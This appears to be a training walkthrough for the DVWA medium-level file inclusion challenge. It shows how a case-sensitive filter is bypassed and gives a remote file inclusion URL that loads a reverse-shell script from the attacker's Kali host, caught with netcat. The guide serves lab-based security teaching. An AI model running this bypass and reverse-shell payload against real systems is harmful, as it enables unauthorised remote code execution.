<b>Challenge URL:</b> /dvwa/vulnerabilities/fi/
<br>
<b>Objective:</b> Read all five famous quotes from <b>../hackable/flags/fi.php</b> using only file inclusion.
<br>
<b>Tools needed:</b> A reverse shell, a temporary web server on Kali, netcat
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/README.md" target="_blank">README</a>?</i>

<h2><b>The Guide</b></h2>

<i>Since this challenge is very similar to the easy mode challenge, I'd highly recommend re-reading <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge%2004:%20File%20Inclusion.md" target="_blank">our notes from before</a>. We'll be using a lot of the analysis and code from before.</i>

<h3><b>What's Changed</b></h3>

As always, let's start by clicking the "View Source" button on the bottom right of the challenge.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/fisource.png" width="500">

We see that the code tries to remove all strings fitting the format <code>http&#58;//</code>, <code>https&#58;//</code>, <code>../</code> or <code>..\\</code>. The developers hoped to protect against remote file inclusion with the first two strings and local file inclusions with the last two. Let's see how effective they are.

<h3><b>Crafting a New Exploit</b></h3>

When reading documentation on <code><a href="https://www.w3schools.com/php/func_string_str_replace.asp" target="_blank">str_replace()</a></code>, we note a key line as follows:

<blockquote>Note: This function is case-sensitive. Use the str_ireplace() function to perform a case-insensitive search.</blockquote>

That means that anything that does not match <code>http&#58;//</code>, <code>https&#58;//</code>, <code>../</code> or <code>..\\</code> EXACTLY will still work. So let's modify our easy mode exploit by converting <code>http</code> to <code>HTTP</code> and try to replicate the exploit:

<b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=HTTP&#58;//</b>[your_Kali_IP]<b>:9999/php-reverse-shell.php</b>

And check our <code>netcat</code> listener:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/medium/screenshots/ficomplete.png" width="500">

... And it really was that easy. Challenge complete!
